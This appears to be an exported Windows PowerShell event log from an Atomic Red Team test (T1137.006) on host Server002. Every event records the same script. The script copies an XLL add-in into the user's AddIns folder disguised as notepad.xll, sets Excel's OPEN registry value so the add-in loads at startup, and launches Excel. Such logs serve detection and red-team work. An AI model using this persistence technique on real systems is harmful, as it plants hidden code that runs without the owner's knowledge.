{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 16:16:40.6655426"},"EventRecordID":"1091","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=c4715705-2910-44df-bd2e-2763cac1b614\r\n\tHostApplication=powershell.exe &amp; {$excelApp = New-Object -COMObject \"Excel.Application\"\r\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\r\n Write-Host \"64-bit Office\"\r\n Copy \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1137.006\\bin\\Addins\\excelxll_x64.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\r\n}\r\nelse{\r\n Write-Host \"32-bit Office\"\r\n Copy \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1137.006\\bin\\Addins\\excelxll_x86.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\r\n}\r\n$ver = $excelApp.version\r\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options\"\r\nRemove-Item $ExcelRegPath -ErrorAction Ignore\r\nNew-Item -type Directory $ExcelRegPath | Out-Null\r\nNew-ItemProperty $ExcelRegPath OPEN -value \"/R notepad.xll\" -propertyType string | Out-Null\r\n$excelApp.Quit()\r\nStart-Process \"Excel\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 16:16:40.6970267"},"EventRecordID":"1092","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=c4715705-2910-44df-bd2e-2763cac1b614\r\n\tHostApplication=powershell.exe &amp; {$excelApp = New-Object -COMObject \"Excel.Application\"\r\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\r\n Write-Host \"64-bit Office\"\r\n Copy \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1137.006\\bin\\Addins\\excelxll_x64.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\r\n}\r\nelse{\r\n Write-Host \"32-bit Office\"\r\n Copy \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1137.006\\bin\\Addins\\excelxll_x86.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\r\n}\r\n$ver = $excelApp.version\r\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options\"\r\nRemove-Item $ExcelRegPath -ErrorAction Ignore\r\nNew-Item -type Directory $ExcelRegPath | Out-Null\r\nNew-ItemProperty $ExcelRegPath OPEN -value \"/R notepad.xll\" -propertyType string | Out-Null\r\n$excelApp.Quit()\r\nStart-Process \"Excel\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 16:16:40.6970267"},"EventRecordID":"1093","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=c4715705-2910-44df-bd2e-2763cac1b614\r\n\tHostApplication=powershell.exe &amp; {$excelApp = New-Object -COMObject \"Excel.Application\"\r\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\r\n Write-Host \"64-bit Office\"\r\n Copy \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1137.006\\bin\\Addins\\excelxll_x64.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\r\n}\r\nelse{\r\n Write-Host \"32-bit Office\"\r\n Copy \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1137.006\\bin\\Addins\\excelxll_x86.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\r\n}\r\n$ver = $excelApp.version\r\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options\"\r\nRemove-Item $ExcelRegPath -ErrorAction Ignore\r\nNew-Item -type Directory $ExcelRegPath | Out-Null\r\nNew-ItemProperty $ExcelRegPath OPEN -value \"/R notepad.xll\" -propertyType string | Out-Null\r\n$excelApp.Quit()\r\nStart-Process \"Excel\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 16:16:40.6970267"},"EventRecordID":"1094","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=c4715705-2910-44df-bd2e-2763cac1b614\r\n\tHostApplication=powershell.exe &amp; {$excelApp = New-Object -COMObject \"Excel.Application\"\r\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\r\n Write-Host \"64-bit Office\"\r\n Copy \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1137.006\\bin\\Addins\\excelxll_x64.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\r\n}\r\nelse{\r\n Write-Host \"32-bit Office\"\r\n Copy \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1137.006\\bin\\Addins\\excelxll_x86.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\r\n}\r\n$ver = $excelApp.version\r\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options\"\r\nRemove-Item $ExcelRegPath -ErrorAction Ignore\r\nNew-Item -type Directory $ExcelRegPath | Out-Null\r\nNew-ItemProperty $ExcelRegPath OPEN -value \"/R notepad.xll\" -propertyType string | Out-Null\r\n$excelApp.Quit()\r\nStart-Process \"Excel\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 16:16:40.6970267"},"EventRecordID":"1095","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=c4715705-2910-44df-bd2e-2763cac1b614\r\n\tHostApplication=powershell.exe &amp; {$excelApp = New-Object -COMObject \"Excel.Application\"\r\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\r\n Write-Host \"64-bit Office\"\r\n Copy \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1137.006\\bin\\Addins\\excelxll_x64.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\r\n}\r\nelse{\r\n Write-Host \"32-bit Office\"\r\n Copy \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1137.006\\bin\\Addins\\excelxll_x86.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\r\n}\r\n$ver = $excelApp.version\r\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options\"\r\nRemove-Item $ExcelRegPath -ErrorAction Ignore\r\nNew-Item -type Directory $ExcelRegPath | Out-Null\r\nNew-ItemProperty $ExcelRegPath OPEN -value \"/R notepad.xll\" -propertyType string | Out-Null\r\n$excelApp.Quit()\r\nStart-Process \"Excel\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 16:16:40.6970267"},"EventRecordID":"1096","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=c4715705-2910-44df-bd2e-2763cac1b614\r\n\tHostApplication=powershell.exe &amp; {$excelApp = New-Object -COMObject \"Excel.Application\"\r\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\r\n Write-Host \"64-bit Office\"\r\n Copy \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1137.006\\bin\\Addins\\excelxll_x64.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\r\n}\r\nelse{\r\n Write-Host \"32-bit Office\"\r\n Copy \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1137.006\\bin\\Addins\\excelxll_x86.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\r\n}\r\n$ver = $excelApp.version\r\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options\"\r\nRemove-Item $ExcelRegPath -ErrorAction Ignore\r\nNew-Item -type Directory $ExcelRegPath | Out-Null\r\nNew-ItemProperty $ExcelRegPath OPEN -value \"/R notepad.xll\" -propertyType string | Out-Null\r\n$excelApp.Quit()\r\nStart-Process \"Excel\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 16:16:40.9379550"},"EventRecordID":"1097","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=c4715705-2910-44df-bd2e-2763cac1b614\r\n\tHostApplication=powershell.exe &amp; {$excelApp = New-Object -COMObject \"Excel.Application\"\r\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\r\n Write-Host \"64-bit Office\"\r\n Copy \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1137.006\\bin\\Addins\\excelxll_x64.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\r\n}\r\nelse{\r\n Write-Host \"32-bit Office\"\r\n Copy \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1137.006\\bin\\Addins\\excelxll_x86.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\r\n}\r\n$ver = $excelApp.version\r\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options\"\r\nRemove-Item $ExcelRegPath -ErrorAction Ignore\r\nNew-Item -type Directory $ExcelRegPath | Out-Null\r\nNew-ItemProperty $ExcelRegPath OPEN -value \"/R notepad.xll\" -propertyType string | Out-Null\r\n$excelApp.Quit()\r\nStart-Process \"Excel\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=5404fec0-a534-470d-8e6b-79f9e7a1304c\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 16:16:42.5373364"},"EventRecordID":"1098","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=17\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=c4715705-2910-44df-bd2e-2763cac1b614\r\n\tHostApplication=powershell.exe &amp; {$excelApp = New-Object -COMObject \"Excel.Application\"\r\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\r\n Write-Host \"64-bit Office\"\r\n Copy \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1137.006\\bin\\Addins\\excelxll_x64.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\r\n}\r\nelse{\r\n Write-Host \"32-bit Office\"\r\n Copy \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1137.006\\bin\\Addins\\excelxll_x86.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\r\n}\r\n$ver = $excelApp.version\r\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options\"\r\nRemove-Item $ExcelRegPath -ErrorAction Ignore\r\nNew-Item -type Directory $ExcelRegPath | Out-Null\r\nNew-ItemProperty $ExcelRegPath OPEN -value \"/R notepad.xll\" -propertyType string | Out-Null\r\n$excelApp.Quit()\r\nStart-Process \"Excel\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=5404fec0-a534-470d-8e6b-79f9e7a1304c\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
